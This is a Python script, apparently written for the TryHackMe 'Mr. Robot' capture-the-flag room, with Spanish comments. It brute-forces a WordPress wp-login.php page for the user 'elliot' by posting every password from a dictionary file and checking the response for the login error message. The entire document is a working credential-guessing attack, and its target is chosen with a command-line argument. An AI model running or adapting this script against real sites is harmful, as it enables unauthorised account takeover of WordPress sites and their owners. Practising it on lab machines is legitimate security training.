import os
import requests
import sys 
from bs4 import BeautifulSoup # Parse
import time
import argparse

ordinaryParse = argparse.ArgumentParser(description="Intrusion a Mr. Robot |  TryHackMe") 
ordinaryParse.add_argument('-t', '--tarjet', help='Indica un sitio web \n (https://example.com)')
ordinaryParse = ordinaryParse.parse_args()


def main():
    if ordinaryParse.tarjet:
        horaInicio = time.strftime("%c")
        
        urlTarjet=ordinaryParse.tarjet
        
        urlSite= (f'http://{urlTarjet}/wp-login.php')
        print(f"URL a consultar: {urlSite}")
        dicc = '/home/sk1dush/THM/MrRobot/sk_Uniqueic.dic'
        headersSite={'Content-Type': 'application/x-www-form-urlencoded'}

        user='elliot'
        errorSite = 'The password you entered for the username'

        #Condicional with open('/home/sk1dush/THM/MrRobot/sk_UniqueDic.dic') as f:
        with open(dicc) as dic:
            for password in dic:
                dataSite = (f"log={user}&pwd={password}")
                urlRequest= requests.post(urlSite, data=dataSite,headers=headersSite)
                textSoup = BeautifulSoup(urlRequest.text, 'html.parser')
                textSoupFilter = textSoup.find_all('div',id="login_error")
                
                #Convertidor de List
                textList = []                
                for x in textSoupFilter:
                    textList.append(str(x))

                #Convertidor de String
                textString= ""
                textString =  textString.join(textList)

                #Localizar
                validator = textString.find(errorSite)

                if validator != 47:
                    print(f"Hora de inicio: {horaInicio}")
                    horaFin = time.strftime("%c")
                    print(f"La contrasena de Elliot es: {password}")
                    print(f"Hora de fin: {horaFin}")
                    #Por si quieres revisar la salida
                    # text2 = textSoup = textSoup.div
                    # print(text2)
                    break
                else:
                    clear = lambda: os.system ("clear")
                    clear()
                    print(f"Intendando contrasena...{password}...",end=" ")
    else:
        print("No hay objetivo definido")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
